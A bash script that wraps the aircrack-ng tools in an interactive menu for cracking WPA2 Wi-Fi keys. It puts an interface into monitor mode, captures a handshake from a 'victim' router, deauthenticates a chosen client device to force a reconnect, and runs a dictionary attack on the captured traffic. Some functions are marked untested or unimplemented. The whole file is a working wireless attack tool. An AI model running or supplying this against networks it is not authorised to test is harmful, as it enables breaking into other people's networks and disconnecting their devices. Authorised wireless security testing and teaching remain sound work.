#!/bin/bash/

##	 WPA2 cracking script	##
#

#
# IFATK: interface name, not yet in Monitor Mode 
# IFMON: interface name in Monitor Mode
# BSSID: Client's MAC Address (victim router)
# ESSID: Client's AP Name
# STATION: Station's MAC Address (victim device)
#


if [ $UID !=  0 ]; then
	echo "[!] Script $0 requires SUPERUSER privileges to be executed."
	exit
fi

set_params(){
# setup interfaces to be used in the program

	IFATK="wlp3s0"	# default
	echo -e "\n\033[31m[*] Select interface to use: \033[0m\n"
	INTERFS=$(iwconfig) # | grep ESSID | awk '{ print $1 }')
	# when iwconfig is deprecated: iw dev
	echo -e "$INTERFS"	

	#	NOT WORKING PROPERLY
	#select IFATK in $INTERFS; do
	#	break
	#done
	
	read -p "[+] Enter your attacking interface: " IFATK
	# read -p "[-] Enter your attacking interface name (use '$ ip a'/'$ ifconfig') [default: wlp3s0]: " IFATK
	
	echo -e "\n[-] Chosen Attacking Interface: $IFATK"
}


#
# #	UNTESTED:
check_mac(){
	if [ ! "${#1}" -eq "17" ]; then
		echo -e "\033[31m Incorrect MAC \n\033[0m"
		exit
	fi
}	


# 	TODO
# # 	UNIMPLEMENTED
change_mac(){
	ip link set $IFATK down
	macchanger -r $IFATK 
	# grep -oE 'New MAC: (.*)'
	ip link set $IFATK up 
	ip addr show dev $IFATK
	menu
}


set_monitor(){
	echo -e "[-] Setting interface <$IFATK> into monitor mode..."
	# TODO: show interface name?

	airmon-ng start $IFATK

	IFMON="${IFATK}mon"
	# interface changed; append 'mon' to name
	# $ifmon = wlp3s0mon (default)
	echo -e "[-] Interface changed. Current: $IFMON"
	
	menu
}


stop_monitor(){
	#TODO
	# declare a variable to store state. ONLY if monitor mode has been set, we do next line
	echo -e "[-] Stopping monitor mode on <$IFMON>"
	airmon-ng stop $IFMON
	
	exit
}


sniffing(){
	
	echo -e "[-] Starting sniffing process..."
	echo -e "[-] Channel needs to be chosen, I can launch 'airodump-ng' for you to chose it."
	#>$ sudo airodump-ng 'monitor_if' can be used)"
	# if channel not yet located:
	#  sudo airodump-ng <ifmon>
	read -p "Do you want me to? (Y/n)" choice
	case "$choice" in
		y|Y) x-terminal-emulator -e airodump-ng $IFMON;;
		n|N)echo -e "Oh, you have it already!" ;;
		* ) echo -e "Invalid answer";;
	esac

	read -p "[+] Enter AP's MAC (BSSID): " BSSID
	# TODO: 
	# check_mac() $BSSID
	read -p "[+] Enter Client Station's MAC:" STATION
	# check_mac() $STATION 
	read -p "[+] Enter AP's operating channel: " ch_num
	read -p "[+] Enter filename for captured data: " outfile

#	airodump-ng $IFMON -c $ch_num -b $BSSID -w $outfile
	#		--channel   --bssid   --write
	xterm -hold -title "Obtaining handshake in $BSSID" -geometry 96x60+0+0 -bg "#000000" -fg "#FFFFFF" -e airodump-ng --bssid $BSSID -c $ch_num -w $outfile $IFMON && menu
	# && clear && menu

	# open new terminal window, running 'airodump' command
	# keep working on the other
}

deauthentication(){
	echo -e "[-] Starting Deauthentication: "
	echo -e "[-] AP's MAC: $BSSID"
	read -p "[+] Enter Client's MAC Address: " STATION
	# check_mac() $STATION
	read -p "[+] Enter the number of deauthentications: " dnum

	xterm -hold -geometry 70x25-0+0 -g "#000000" -fg "#99CCFF" -title "Deauthing $STATION from $BSSID ($dnum number of times)" -e aireplay-ng -0 $dnum -a $BSSID -c $STATION $IFMON
	#	-0 = --deauth	
}


cracking(){
	echo -e "[-] Starting Wireless Key cracking..."
	read -p "[+] Enter path for dictionary file: " dict
	read -p "[+] Enter path for captured traffic file: " capdata

	# LS_DIR=$(ls *.cap)
	# select DATA in $LS_DIR; do
	#	break;
	# done
	
	xterm -hold -geometry 70x25-0+0 -bg "#000000" -fg "#99CCFF" -title "Obtaining key through dictionary: $dict" -hold -e aircrack-ng -w $dict $capdata
	menu
}


show_info(){

	echo -e "Attacking Interface: $IFATK"
	echo -e "Monitor Interface: $IFMON"
	echo -e "Victim's MAC address: $BSSID"
	echo -e "Victim's Wireless Name: $ESSID"
	echo -e "Target Station's MAC address: $STATION"
	menu
}


menu(){
	echo -e "\n[*] Options; \n"
	echo -e "\033[31m-=-=-=-=-=-=-=-=-=-=-=-=-=-\033[0m" 
#	echo -e "0 - Change MAC (optional)"
	echo 	"1 - Activate Monitor Mode"
	echo 	"2 - Handshake capture"
	echo 	"3 - Deauthenticate client"
	echo 	"4 - Crack key (Dictionary attack)"
	echo 	"5 - Show current information"
	echo 	"6 - Exit"
	echo -e "\033[31m-=-=-=-=-=-=-=-=-=-=-=-=-=-\033[0m" 

	read -p "Your option >> " OPTION

	case $OPTION in 
#		"0") change_mac;;
		"1") set_monitor;;
		"2") sniffing;;
		"3") deauthentication;;
		"4") cracking;;
		"5") show_info;;
		"6") stop_monitor;;	# contains exit function		
	
	*) echo -e "\033[31m[!] INVALID OPTION \n\033[0m" && menu;;
	
	esac
}

set_params
menu



# __EOF__
###########
